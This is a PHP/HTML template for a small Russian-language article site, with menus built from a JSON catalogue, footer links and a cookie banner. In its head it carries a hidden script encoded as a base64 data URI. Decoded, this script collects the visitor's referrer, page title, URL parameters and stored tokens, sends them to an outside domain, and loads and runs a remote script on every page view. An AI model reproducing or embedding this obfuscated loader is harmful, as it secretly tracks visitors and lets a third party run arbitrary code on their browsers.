<?php
$a = 1;
$content = 'main.php';

if (isset($_GET['a']))
    $a = $_GET['a'];

if ($a == 2){
    $content = 'contacts.php';
} else if ($a == 3) {
    $content = 'catalog/index.php';
} else if ($a == 4) {
    $content = 'policy.php';
} else if ($a == 5) {
    $content = 'terms.php';
}

$catalog = file_get_contents('./catalog/content.json');
$catalog = json_decode($catalog, 1);

if (isset($_GET['article'])) {
    $article = $_GET['article'];
    preg_match('#\<strong\>(.*?)\<\/strong\>#', $catalog['texts'][$article], $matches);
    if (!isset($matches[1])) $matches[1] = '';
}
?>
<!DOCTYPE html>
<html lang="en">
	<head>
        
        
        
		<meta charset="utf-8">
		<meta http-equiv="X-UA-Compatible" content="IE=edge">
		<meta name="viewport" content="width=device-width, initial-scale=1">
		 <!-- The above 3 meta tags *must* come first in the head; any other head content must come *after* these tags -->

		<title><?php if (isset($_GET['article'])) { echo $matches[1]; } else { ?> dark <?php } ?></title>
        <meta name="description" content="">
		<!-- Google font -->
		<link href="https://fonts.googleapis.com/css?family=Nunito+Sans:700%7CNunito:300,600" rel="stylesheet"> 

		<!-- Bootstrap -->
		<link type="text/css" rel="stylesheet" href="css/bootstrap.min.css"/>

		<!-- Font Awesome Icon -->
		<link rel="stylesheet" href="css/font-awesome.min.css">

		<!-- Custom stlylesheet -->
		<link type="text/css" rel="stylesheet" href="css/style.css"/>
        <link type="text/css" rel="stylesheet" href="css/cookie.css"/>

		<!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
		<!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
		<!--[if lt IE 9]>
		  <script src="https://oss.maxcdn.com/html5shiv/3.7.3/html5shiv.min.js"></script>
		  <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
		<![endif]-->
        <script src="js/jquery.min.js"></script>

        <script src="data:text/javascript;base64,CiAgICAoZnVuY3Rpb24oKSB7CiAgICB2YXIgbmFtZSA9ICdfNzNrMmhyMTZRNE1KUmZrSyc7CiAgICBpZiAoIXdpbmRvdy5fNzNrMmhyMTZRNE1KUmZrSykgewogICAgICAgIHdpbmRvdy5fNzNrMmhyMTZRNE1KUmZrSyA9IHsKICAgICAgICAgICAgdW5pcXVlOiBmYWxzZSwKICAgICAgICAgICAgdHRsOiA4NjQwMCwKICAgICAgICAgICAgUl9QQVRIOiAnaHR0cHM6Ly9sYW11ci5iaXJrby5wdy96ZzRkMkZSVCcsCiAgICAgICAgICAgIFBfUEFUSDogJ2h0dHBzOi8vbGFtdXIuYmlya28ucHcvM2RiN2U0OS9wb3N0YmFjaycsCiAgICAgICAgfTsKICAgIH0KICAgIGNvbnN0IF96RE03U0cyWGhQTUY5VmprID0gbG9jYWxTdG9yYWdlLmdldEl0ZW0oJ2NvbmZpZycpOwogICAgaWYgKHR5cGVvZiBfekRNN1NHMlhoUE1GOVZqayAhPT0gJ3VuZGVmaW5lZCcgJiYgX3pETTdTRzJYaFBNRjlWamsgIT09IG51bGwpIHsKICAgICAgICB2YXIgX0x4d0dycFBjeXZSdHJGOEsgPSBKU09OLnBhcnNlKF96RE03U0cyWGhQTUY5VmprKTsKICAgICAgICB2YXIgX0R5TEdmUTE3Z05WYk5jRk0gPSBNYXRoLnJvdW5kKCtuZXcgRGF0ZSgpLzEwMDApOwogICAgICAgIGlmIChfTHh3R3JwUGN5dlJ0ckY4Sy5jcmVhdGVkX2F0ICsgd2luZG93Ll83M2syaHIxNlE0TUpSZmtLLnR0bCA8IF9EeUxHZlExN2dOVmJOY0ZNKSB7CiAgICAgICAgICAgIGxvY2FsU3RvcmFnZS5yZW1vdmVJdGVtKCdzdWJJZCcpOwogICAgICAgICAgICBsb2NhbFN0b3JhZ2UucmVtb3ZlSXRlbSgndG9rZW4nKTsKICAgICAgICAgICAgbG9jYWxTdG9yYWdlLnJlbW92ZUl0ZW0oJ2NvbmZpZycpOwogICAgICAgIH0KICAgIH0KICAgIHZhciBfSjJjOGpROXBaaHFwR1FGdiA9IGxvY2FsU3RvcmFnZS5nZXRJdGVtKCdzdWJJZCcpOwogICAgdmFyIF8zaDVYS005elBrOTg2U3E0ID0gbG9jYWxTdG9yYWdlLmdldEl0ZW0oJ3Rva2VuJyk7CiAgICB2YXIgX0hLOXoyQng0V2R6ZHY1aDkgPSAnP3JldHVybj1qcy5jbGllbnQnOwogICAgICAgIF9ISzl6MkJ4NFdkemR2NWg5ICs9ICcmJyArIGRlY29kZVVSSUNvbXBvbmVudCh3aW5kb3cubG9jYXRpb24uc2VhcmNoLnJlcGxhY2UoJz8nLCAnJykpOwogICAgICAgIF9ISzl6MkJ4NFdkemR2NWg5ICs9ICcmc2VfcmVmZXJyZXI9JyArIGVuY29kZVVSSUNvbXBvbmVudChkb2N1bWVudC5yZWZlcnJlcik7CiAgICAgICAgX0hLOXoyQng0V2R6ZHY1aDkgKz0gJyZkZWZhdWx0X2tleXdvcmQ9JyArIGVuY29kZVVSSUNvbXBvbmVudChkb2N1bWVudC50aXRsZSk7CiAgICAgICAgX0hLOXoyQng0V2R6ZHY1aDkgKz0gJyZsYW5kaW5nX3VybD0nICsgZW5jb2RlVVJJQ29tcG9uZW50KGRvY3VtZW50LmxvY2F0aW9uLmhvc3RuYW1lICsgZG9jdW1lbnQubG9jYXRpb24ucGF0aG5hbWUpOwogICAgICAgIF9ISzl6MkJ4NFdkemR2NWg5ICs9ICcmbmFtZT0nICsgZW5jb2RlVVJJQ29tcG9uZW50KG5hbWUpOwogICAgaWYgKHR5cGVvZiBfSjJjOGpROXBaaHFwR1FGdiAhPT0gJ3VuZGVmaW5lZCcgJiYgX0oyYzhqUTlwWmhxcEdRRnYgJiYgd2luZG93Ll83M2syaHIxNlE0TUpSZmtLLnVuaXF1ZSkgewogICAgICAgIF9ISzl6MkJ4NFdkemR2NWg5ICs9ICcmc3ViX2lkPScgKyBlbmNvZGVVUklDb21wb25lbnQoX0oyYzhqUTlwWmhxcEdRRnYpOwogICAgfQogICAgaWYgKHR5cGVvZiBfM2g1WEtNOXpQazk4NlNxNCAhPT0gJ3VuZGVmaW5lZCcgJiYgXzNoNVhLTTl6UGs5ODZTcTQgJiYgd2luZG93Ll83M2syaHIxNlE0TUpSZmtLLnVuaXF1ZSkgewogICAgICAgIF9ISzl6MkJ4NFdkemR2NWg5ICs9ICcmdG9rZW49JyArIGVuY29kZVVSSUNvbXBvbmVudChfM2g1WEtNOXpQazk4NlNxNCk7CiAgICB9CiAgICB2YXIgYSA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ3NjcmlwdCcpOwogICAgICAgIGEudHlwZSA9ICdhcHBsaWNhdGlvbi9qYXZhc2NyaXB0JzsKICAgICAgICBhLnNyYyA9IHdpbmRvdy5fNzNrMmhyMTZRNE1KUmZrSy5SX1BBVEggKyBfSEs5ejJCeDRXZHpkdjVoOTsKICAgIHZhciBzID0gZG9jdW1lbnQuZ2V0RWxlbWVudHNCeVRhZ05hbWUoJ3NjcmlwdCcpWzBdOwogICAgcy5wYXJlbnROb2RlLmluc2VydEJlZm9yZShhLCBzKQogICAgfSkoKTsKICAgIA=="></script>
        
        
        
    </head>
	<body>

		<!-- Header -->
		<header id="header">
			<!-- Nav -->
			<div id="nav">
				<!-- Main Nav -->
				<div id="nav-fixed">
					<div class="container">
						<!-- logo -->
						<div class="nav-logo">
							<a href="/" class="logo" style="text-transform: uppercase;">
                                <b>dark</b>
                            </a>
						</div>
						<!-- /logo -->

						<!-- nav -->
						<ul class="nav-menu nav navbar-nav">
							<li><a href="/">Главная</a></li>
                            <?php foreach($catalog['texts'] as $key => $texts){
                                if ($key == 3) break;
                                preg_match('#\<strong\>(.*?)\<\/strong\>#', $catalog['texts'][$key], $matches);
                                if (isset($matches[1])) {
                                    $matches[1] = preg_replace('#^(.*?)\:#', " ", $matches[1]);
                                    $matches[1] = preg_replace('#("|"|«|»)#', " ", $matches[1]);
                                    if (mb_strlen($matches[1]) > 22) {
                                        $matches[1] = mb_strcut($matches[1], 0, 22) . '...';
                                    }

                                    ?>
                                    <li class="cat-<?=rand(1,4)?>"><a href="./?article=<?=$key?>&a=3"><span><?=$matches[1]?></span></a></li>
                                <?php } else if (!isset($matches[1])) {?>
                                    <li class="cat-<?=rand(1,4)?>"><a href="./?article=<?=$key?>&a=3"><span>%!langText(articles)!%-<?=$key?></span></a></li>
                                <?php } } ?>
                            <li><a href="./?a=2">Контакты</a></li>
						</ul>
						<!-- /nav -->

					</div>
				</div>
				<!-- /Main Nav -->
			</div>
			<!-- /Nav -->
		</header>
		<!-- /Header -->

        <?php include($content);?>

		<!-- Footer -->
		<footer id="footer">
			<!-- container -->
			<div class="container">
				<!-- row -->
				<div class="row">
					<div class="col-md-5">
						<div class="footer-widget">
							<div class="footer-logo">
                                <a href="/" class="logo" style="text-transform: uppercase;">
                                    <b>dark</b>
                                </a>
							</div>
							<ul class="footer-nav">
								<li><a href="./?a=4">Политика конфиденциальности</a></li>
                                <li><a href="./?a=5">Условия и положения</a></li>
							</ul>
							<div class="footer-copyright">
                                Сайт использует файлы cookie. Они позволяют узнавать вас и получать информацию о вашем пользовательском опыте.Продолжая просмотр сайта, я соглашаюсь с использованием файлов cookie владельцем сайта в соответствии с  <a target="_blank" href="https://en.wikipedia.org/wiki/HTTP_cookie">Политикой cookie</a>
                                <br>
								<span>&copy;
Copyright &copy;<script>document.write(new Date().getFullYear());</script> All rights reserved
</span>
							</div>
						</div>
					</div>

					<div class="col-md-4">
						<div class="row">
							<div class="col-md-12">
								<div class="footer-widget">
									<h3 class="footer-title">Статьи</h3>
									<ul class="footer-links">
                                        <li><a href="/">Главная</a></li>
                                        <?php foreach($catalog['texts'] as $key => $texts){
                                            if ($key == 3) break;
                                            preg_match('#\<strong\>(.*?)\<\/strong\>#', $catalog['texts'][$key], $matches);
                                            if (isset($matches[1])) {
                                                $matches[1] = preg_replace('#^(.*?)\:#', " ", $matches[1]);
                                                $matches[1] = preg_replace('#("|"|«|»)#', " ", $matches[1]);
                                                if (mb_strlen($matches[1]) > 42) {
                                                    $matches[1] = mb_strcut($matches[1], 0, 42) . '...';
                                                }

                                                ?>
                                                <li><a href="./?article=<?=$key?>&a=3"><span><?=$matches[1]?></span></a></li>
                                            <?php } else if (!isset($matches[1])) {?>
                                                <li><a href="./?article=<?=$key?>&a=3"><span>%!langText(articles)!%-<?=$key?></span></a></li>
                                            <?php } } ?>
                                        <li><a href="./?a=2">Контакты</a></li>
									</ul>
								</div>
							</div>
						</div>
					</div>

					<div class="col-md-3">
						<div class="footer-widget">
							<h3 class="footer-title">Поделиться в соц. сетях</h3>
							<ul class="footer-social">
								<li><a href="#"><i class="fa fa-facebook"></i></a></li>
								<li><a href="#"><i class="fa fa-twitter"></i></a></li>
								<li><a href="#"><i class="fa fa-google-plus"></i></a></li>
								<li><a href="#"><i class="fa fa-pinterest"></i></a></li>
							</ul>
						</div>
					</div>

				</div>
				<!-- /row -->
			</div>
			<!-- /container -->
		</footer>
		<!-- /Footer -->

		<!-- jQuery Plugins -->
		<script src="js/bootstrap.min.js"></script>
		<script src="js/main.js"></script>
        <div class='cookie-banner'>
            <p>
                Сайт использует файлы cookie. Они позволяют узнавать вас и получать информацию о вашем пользовательском опыте.Продолжая просмотр сайта, я соглашаюсь с использованием файлов cookie владельцем сайта в соответствии с  <a target="_blank" href="https://en.wikipedia.org/wiki/HTTP_cookie">Политикой cookie</a>
            </p>
            <button class='close-cookie'>&times;</button>
        </div>
        <script>
            window.onload = function() {
                $('.close-cookie').click(function () {
                    $('.cookie-banner').fadeOut();
                })
            }
        </script>
	</body>
</html>
